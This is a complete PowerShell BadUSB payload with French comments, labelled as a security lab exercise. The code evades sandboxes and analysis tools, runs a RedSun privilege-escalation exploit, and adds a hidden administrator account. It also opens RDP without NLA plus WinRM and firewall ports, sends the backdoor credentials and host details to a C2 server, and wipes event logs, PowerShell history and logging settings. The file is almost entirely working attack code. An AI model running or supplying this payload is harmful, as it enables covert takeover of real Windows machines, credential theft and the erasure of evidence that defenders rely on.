# ==============================================================
# payload.ps1 – Charge utile BadUSB (Partie 1) avec RedSun LPE
# Objectif pédagogique : TP sécurité offensive / défensive
#
# Scénario :
#   1. Anti-analyse  : détection sandbox/VM + outils de débogage
#   2. Élévation     : RedSun (Local Privilege Escalation via Defender)
#   3. Backdoor      : création d'un compte administrateur caché
#   4. Accès distant : activation RDP + WinRM + règles pare-feu
#   5. Exfiltration  : envoi des accès au serveur C2
#   6. Couverture    : nettoyage des journaux et de l'historique
#
# Prérequis USB :
#   - payload.ps1  (ce fichier)
#   - RedSun.exe   (LPE exploit – doit être à la racine de la clé)
#   - launcher.vbs
#   - autorun.inf
# ==============================================================

$ErrorActionPreference = "SilentlyContinue"

# ──────────────────────────────────────────────────────────────
# 1. MÉCANISMES ANTI-ANALYSE / ANTI-SANDBOX
# ──────────────────────────────────────────────────────────────

function Test-Sandbox {
    <#
    .SYNOPSIS
        Retourne $true si le script tourne dans un environnement
        d'analyse (VM, sandbox, débogueur).
    #>

    # 1-a. Processus propres aux hyperviseurs courants
    $vmProcs = @(
        "vmtoolsd","vmwaretray","vmwareuser","vmacthlp",
        "vboxservice","vboxtray","vgauthservice",
        "vmnat","vmnetdhcp","vmware-vmx"
    )
    foreach ($p in $vmProcs) {
        if (Get-Process -Name $p -EA 0) { return $true }
    }

    # 1-b. Outils d'analyse dynamique / reverse engineering
    $analysisProcs = @(
        "procmon","procmon64","processhacker","procexp","procexp64",
        "wireshark","fiddler","charles","burpsuite",
        "ollydbg","x64dbg","x32dbg","ida","ida64",
        "immunitydebugger","windbg","pestudio","die"
    )
    foreach ($p in $analysisProcs) {
        if (Get-Process -Name $p -EA 0) { return $true }
    }

    # 1-c. Mémoire RAM insuffisante (< 2 Go = sandbox probable)
    $ram = (Get-CimInstance -ClassName Win32_ComputerSystem -EA 0).TotalPhysicalMemory
    if ($ram -and $ram -lt 2147483648) { return $true }

    # 1-d. Nombre de cœurs logiques trop faible
    $cores = (Get-CimInstance -ClassName Win32_Processor -EA 0).NumberOfLogicalProcessors
    if ($cores -and $cores -lt 2) { return $true }

    # 1-e. Espace disque total trop faible (< 50 Go)
    $diskTotal = (Get-CimInstance -ClassName Win32_DiskDrive -EA 0 |
                  Measure-Object -Property Size -Sum).Sum
    if ($diskTotal -and $diskTotal -lt 53687091200) { return $true }

    # 1-f. Clés de registre typiques des environnements virtuels
    $vmRegKeys = @(
        "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools",
        "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions",
        "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest"
    )
    foreach ($k in $vmRegKeys) {
        if (Test-Path $k) { return $true }
    }

    return $false
}

# Abandon silencieux si environnement suspect
if (Test-Sandbox) { exit }

# Légère pause pour échapper à l'analyse comportementale à chaud
Start-Sleep -Milliseconds 800

# ──────────────────────────────────────────────────────────────
# 2. ÉLÉVATION DE PRIVILÈGES AVEC RedSun (LPE via Defender)
#    Référence : CVE exploitée par RedSun (Local Privilege Escalation)
#    RedSun.exe doit être présent à la racine de la clé USB.
# ──────────────────────────────────────────────────────────────

function Test-Admin {
    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    # Lance RedSun pour obtenir une élévation SYSTEM depuis un compte standard
    $redsunPath = Join-Path $PSScriptRoot "RedSun.exe"
    if (Test-Path $redsunPath) {
        Start-Process -FilePath $redsunPath -WindowStyle Hidden
        Start-Sleep -Seconds 5
    }
    exit
}

# ──────────────────────────────────────────────────────────────
# 3. CRÉATION DU COMPTE ADMINISTRATEUR CACHÉ
# ──────────────────────────────────────────────────────────────

# Génération d'identifiants aléatoires (difficile à deviner / lister)
$charset  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
$suffix   = -join ($charset.ToCharArray() | Get-Random -Count 6)
$backdoorUser = "svc_" + $suffix       # ex : svc_xKp3mT

$pwChars  = $charset + "!@#$%^&*()-_=+"
$backdoorPass = -join ($pwChars.ToCharArray() | Get-Random -Count 18)

# Création du compte local
$null = net user $backdoorUser $backdoorPass /add /expires:never `
        /passwordreq:yes /comment:"Service Account" 2>&1

# Ajout aux groupes privilégiés
$null = net localgroup Administrators        $backdoorUser /add 2>&1
$null = net localgroup "Remote Desktop Users" $backdoorUser /add 2>&1

# Désactivation de l'expiration du mot de passe
$null = wmic useraccount where "Name='$backdoorUser'" set PasswordExpires=FALSE 2>&1

# Masquage du compte sur l'écran de connexion Windows
$loginHideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$null = New-ItemProperty -Path $loginHideKey -Name $backdoorUser -Value 0 `
        -PropertyType DWORD -Force 2>&1

# ──────────────────────────────────────────────────────────────
# 4. ACTIVATION DE L'ACCÈS DISTANT (RDP + WinRM)
# ──────────────────────────────────────────────────────────────

# ── 4-a. Remote Desktop Protocol (RDP) ──
$null = Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
        -Name "fDenyTSConnections" -Value 0 -Force 2>&1
# Désactivation de l'authentification NLA (Network Level Authentication)
# pour permettre la connexion sans validation Kerberos préalable
$null = Set-ItemProperty `
        -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
        -Name "UserAuthentication" -Value 0 -Force 2>&1
# Activation des règles pare-feu prédéfinies pour RDP
$null = Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 2>&1

# ── 4-b. Windows Remote Management (WinRM / PowerShell distant) ──
$null = Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>&1
$null = Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force 2>&1
$null = Set-Service  -Name WinRM -StartupType Automatic 2>&1
$null = Start-Service -Name WinRM 2>&1

# ── 4-c. Règles pare-feu complémentaires (tous profils) ──
$null = netsh advfirewall firewall add rule `
        name="BackdoorRemoteAccess" protocol=TCP dir=in `
        localport=3389,5985,5986 action=allow profile=any 2>&1

# ──────────────────────────────────────────────────────────────
# 5. COLLECTE D'INFORMATIONS ET EXFILTRATION VERS LE SERVEUR C2
# ──────────────────────────────────────────────────────────────

# Récupération de l'adresse IP publique (plusieurs sources de secours)
$publicIP = "Inconnue"
$ipServices = @(
    "https://api.ipify.org",
    "https://checkip.amazonaws.com",
    "https://icanhazip.com"
)
foreach ($svc in $ipServices) {
    try {
        $publicIP = (Invoke-WebRequest -Uri $svc -UseBasicParsing -TimeoutSec 5).Content.Trim()
        if ($publicIP -match '^\d{1,3}(\.\d{1,3}){3}$') { break }
    } catch {}
}

# Adresse IP locale principale (interface non-loopback)
$localIP = (Get-NetIPAddress -AddressFamily IPv4 -EA 0 |
            Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
            Select-Object -First 1).IPAddress

# Informations système
$sysInfo = @{
    computer_name    = $env:COMPUTERNAME
    domain           = $env:USERDOMAIN
    current_user     = $env:USERNAME
    os_version       = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
    local_ip         = $localIP
    public_ip        = $publicIP
    # Accès backdoor créés par ce payload
    backdoor_user    = $backdoorUser
    backdoor_pass    = $backdoorPass
    rdp_port         = 3389
    winrm_port       = 5985
    timestamp        = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
}

$jsonData = $sysInfo | ConvertTo-Json -Compress

# ── Adresse du serveur C2 de l'attaquant ──────────────────────
$c2Base = "http://10.10.1.13:8080"

# ── Tentative 1 : HTTP POST vers le serveur C2 ───────────────
$sent = $false
try {
    $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST `
            -Body $jsonData -ContentType "application/json" `
            -UseBasicParsing -TimeoutSec 8
    if ($resp.StatusCode -eq 200) { $sent = $true }
} catch {}

# ── Tentative 2 (repli) : encodage Base64 en paramètre GET ───
if (-not $sent) {
    try {
        $b64 = [Convert]::ToBase64String(
                   [System.Text.Encoding]::UTF8.GetBytes($jsonData))
        $null = Invoke-WebRequest -Uri "$c2Base/b64?d=$b64" `
                -UseBasicParsing -TimeoutSec 8
    } catch {}
}

# ──────────────────────────────────────────────────────────────
# 6. EFFACEMENT DES TRACES (COUVERTURE)
# ──────────────────────────────────────────────────────────────

# Effacement des journaux d'événements Windows
foreach ($log in @("System","Application","Security","Windows PowerShell",
                    "Microsoft-Windows-PowerShell/Operational")) {
    $null = wevtutil cl "$log" 2>&1
}

# Suppression de l'historique des commandes PowerShell
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $histFile) { $null = Remove-Item $histFile -Force 2>&1 }

# Suppression des fichiers Prefetch (traces d'exécution)
$null = Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>&1

# Désactivation de la journalisation PowerShell en temps réel
$psLogKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
$null = Set-ItemProperty -Path "$psLogKey\ScriptBlockLogging" `
        -Name "EnableScriptBlockLogging" -Value 0 -Force 2>&1
$null = Set-ItemProperty -Path "$psLogKey\Transcription" `
        -Name "EnableTranscripting"      -Value 0 -Force 2>&1
